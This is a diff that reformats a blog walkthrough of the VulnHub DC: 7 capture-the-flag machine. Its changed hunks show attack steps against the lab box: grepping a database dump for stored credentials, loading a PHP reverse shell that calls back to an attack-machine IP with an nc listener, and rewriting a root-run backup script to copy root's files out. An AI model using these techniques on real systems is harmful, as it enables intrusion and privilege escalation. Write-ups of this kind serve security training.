@@ -1,11 +1,21 @@
 ---
-full_title: "VulnHub: DC: 7 Walkthrough"
+full_title: "Entry 0x06 - VulnHub: DC: 7 Walkthrough"
 date: "2019-09-03"
 coverImage: "screen-shot-2019-09-02-at-10.52.52-pm-1.png"
 layout: post
+tags:
+- Beginner
+- CTF
+- Kali
+- Linux
+- Vulnhub
+- Walkthrough
+- Writeup
+- Security
+- DC-Series
 ---
 
-**DC: 7** is a challenge created by DCAU. This is a write-up of my experience solving this awesome CTF challenge.
+**DC: 7** is a challenge posted on [VulnHub](https://www.vulnhub.com/entry/dc-7,356/) created by [DCAU](https://www.vulnhub.com/author/dcau,610/). This is a write-up of my experience solving this awesome CTF challenge.
 
 With my Attack Machine (**Kali Linux**) and Victim Machine (**DC: 7**) set up and running, I decided to get down to solving this challenge.
 
@@ -120,12 +130,12 @@ Let's look inside!
 
 Jackpot! We can clearly see what's happening here. The script flows as follows:
 
-- Delete contents of the `/home/dc7user/backups` directory
-- Use `drush` ([Drupal shell](https://www.digitalocean.com/community/tutorials/a-beginner-s-guide-to-drush-the-drupal-shell)) to create an `SQL` dump of the Drupal database
-- Create a compressed copy of all the website files
-- Encrypt both files using `GPG` with the passphrase `PickYourOwnPassword`
-- Sets the owner of contents inside `/home/dc7user/backups` as `dc7user:dc7user` which means both user and group access is limited to `dc7user`
-- Deletes the files
+1. Delete contents of the `/home/dc7user/backups` directory
+2. Use `drush` ([Drupal shell](https://www.digitalocean.com/community/tutorials/a-beginner-s-guide-to-drush-the-drupal-shell)) to create an `SQL` dump of the Drupal database
+3. Create a compressed copy of all the website files
+4. Encrypt both files using `GPG` with the passphrase `PickYourOwnPassword`
+5. Sets the owner of contents inside `/home/dc7user/backups` as `dc7user:dc7user` which means both user and group access is limited to `dc7user`
+6. Deletes the files
 
 Now, I was ecstatic because I knew how to own this box. This technique is well known in the world of CTF - You modify the script, add in lines to output the contents of `flag.txt` to a readable file and let it run in its own glory as root.
 
@@ -171,25 +181,33 @@ Knowing the table name would be useful. However, I had no clue about Drupal's in
 
 Now, my solution is neither the cleanest nor most efficient... but I wanted the credentials and this worked.
 
-cat website.sql | grep -A 30 "Table structure for table \\\`users\\\`"
+```
+cat website.sql | grep -A 30 "Table structure for table `users`"
+```
 
 ![Screen Shot 2019-09-03 at 7.20.39 PM.png](/assets/images/screen-shot-2019-09-03-at-7.20.39-pm.png)
 
 The optional argument `-A` refers to lines _after_ the matched line. We can conclude that the `users` table does not contain credentials. Moving on to `users_data` using the command:
 
-cat website.sql | grep -A 30 "Table structure for table \\\`users\_data\\\`"
+```
+cat website.sql | grep -A 30 "Table structure for table `users_data`"
+```
 
 ![Screen Shot 2019-09-03 at 7.22.43 PM.png](/assets/images/screen-shot-2019-09-03-at-7.22.43-pm.png)
 
 Nope, nothing. Moving on to the final table `users_field_data` using the command:
 
-cat website.sql | grep -A 30 "Table structure for table \\\`users\_field\_data\\\`"
+```
+cat website.sql | grep -A 30 "Table structure for table `users_field_data`"
+```
 
 ![Screen Shot 2019-09-03 at 7.24.29 PM.png](/assets/images/screen-shot-2019-09-03-at-7.24.29-pm.png)
 
 Woohoo! The table `users_field_data` contains `name`, `pass`, `mail` and other user-specific fields. Let's expand the `grep` and view some data!
 
-cat website.sql | grep -A 40 "Table structure for table \\\`users\_field\_data\\\`"
+```
+cat website.sql | grep -A 40 "Table structure for table `users_field_data`"
+```
 
 ![Screen Shot 2019-09-03 at 7.27.24 PM.png](/assets/images/screen-shot-2019-09-03-at-7.27.24-pm.png)
 
@@ -273,14 +291,17 @@ Great! We installed **PHP filter**. The next step is to use it to upload the `p
 
 Important steps to follow:
 
-- Select the **Text format** as `PHP code`
-- Copy the `php-reverse-shell` code to the **Body**. On Kali Linux, it can be found in `/usr/share/laudanum/php/php-reverse-shell.php`
-- Edit the `php-reverse-shell` code and modify the following lines:
-    - $ip = '192.168.56.102'; // Attack machine IP
-        
-    - $port = 8888; // Desired port
-        
-- Open a shell and run `nc -lvp 8888` on attack machine to listen for a reverse shell
+1. Select the **Text format** as `PHP code`
+2. Copy the `php-reverse-shell` code to the **Body**. On Kali Linux, it can be found in `/usr/share/laudanum/php/php-reverse-shell.php`
+3. Edit the `php-reverse-shell` code and modify the following lines:
+
+    ```
+        - $ip = '192.168.56.102'; // Attack machine IP
+            
+        - $port = 8888; // Desired port
+    ```  
+
+4. Open a shell and run `nc -lvp 8888` on attack machine to listen for a reverse shell
 
 Once these steps are completed. Click on the **Preview** button and watch the magic unfold!
 
@@ -290,8 +311,10 @@ Reverse shell! I am finally `www-data`. Hooray!
 
 Okay... back to the game plan. We simply need to modify `/opt/scripts/backups.sh` with the following lines of code:
 
+```
 #!/bin/bash
 cat /root/\* > /tmp/arj/flag.txt
+```
 
 ![Screen Shot 2019-09-04 at 12.53.32 AM.png](/assets/images/screen-shot-2019-09-04-at-12.53.32-am.png)
 
@@ -311,4 +334,4 @@ I owe credit to @DCAU for an initial hint about the Twitter handle. The idea tha
 
 As always, I cannot wait for the next one in the [DC series](https://www.vulnhub.com/series/dc,199/)!
 
-If you enjoyed reading this, please check out my [DC: 6 walkthrough](https://diaryof0x41.wordpress.com/2019/05/29/vulnhub-dc-6-walkthrough/) and [DC: 3 walkthrough](https://diaryof0x41.wordpress.com/2019/06/03/vulnhub-dc-3-walkthrough/) which are challenges by @DCAU in the [DC series](https://www.vulnhub.com/series/dc,199/).
+If you enjoyed reading this, please check out my [DC: 6 walkthrough](/2019/05/29/vulnhub-dc-6-walkthrough) and [DC: 3 walkthrough](/2019/06/03/vulnhub-dc-3-walkthrough) which are challenges by @DCAU in the [DC series](https://www.vulnhub.com/series/dc,199/).
